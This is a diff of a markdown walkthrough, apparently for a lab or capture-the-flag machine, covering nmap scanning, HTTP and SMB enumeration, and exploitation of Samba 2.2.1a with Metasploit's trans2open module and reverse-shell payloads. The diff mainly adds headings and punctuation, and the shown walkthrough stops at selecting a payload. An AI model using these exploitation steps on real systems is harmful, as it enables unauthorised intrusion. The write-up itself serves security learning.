@@ -8,6 +8,8 @@ target ip: `10.101.85.11`
 
 ## Scanning and Enumeration
 
+### nmap
+
 find the service that running on that target ip.
 
 ```
@@ -85,6 +87,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
 ```
 
+---
+
 ### http explore
 
 open the target ip in browser to find the way to enter the target machine.
@@ -96,7 +100,7 @@ http://10.101.85.11
 
 nothing useful.
 
-![Step1](./images/01.png)
+![](./images/01.png)
 
 i also open the page source but found nothing that useful now.
 
@@ -240,6 +244,8 @@ DOWNLOADED: 13836 - FOUND: 6
 
 i will leave the http exploring for a while and find the other way.
 
+---
+
 ### smb explore
 
 the smb are interesting way for explore, let's investigate it by use `metasploit` and search for the smb version scanner module. 
@@ -308,7 +314,7 @@ Matching Modules
 Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
 ```
 
-use it and look to the setup requirement for this module.
+use it, and look to the setup requirement for this module.
 
 ```
 use 0
@@ -360,7 +366,11 @@ https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/
 
 after reading this documentation, i know the `trans2open` module is effective against `samba 2.2.1a`.
 
+---
+
 ## Exploitation
+
+### trans2open
 
 let's search `trans2open` in `metasploit`.
 
@@ -384,7 +394,7 @@ Interact with a module by name or index. For example info 5, use 5 or use exploi
 After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'
 ```
 
-the `unix (samba 2.2.1a)` is also `linux`, so i will use the module 1 then find setup requirement.
+the `unix (samba 2.2.1a)` is also `linux`, so i will use the module 1 then look at setup requirement.
 
 ```
 use 1
@@ -426,7 +436,7 @@ Exploit target:
 View the full module info with the info, or info -d command.
 ```
 
-set rhosts to target ip then run it.
+set rhosts to target ip, then run it.
 ```
 set RHOSTS 10.101.85.11
 run
@@ -461,7 +471,7 @@ look other payload.
 show payloads
 ```
 
-i decided to use a more stable payload because the target service is quite old.
+i decided to use a more stable payload, because the target service is quite old.
 
 ```
 msf exploit(linux/samba/trans2open) > show payloads
@@ -509,7 +519,7 @@ Compatible Payloads
    35  payload/linux/x86/shell_reverse_tcp_ipv6          .                normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)
 ```
 
-i use payload 34 then try agin.
+i use payload 34, then try agin.
 
 ```
 set payload 34
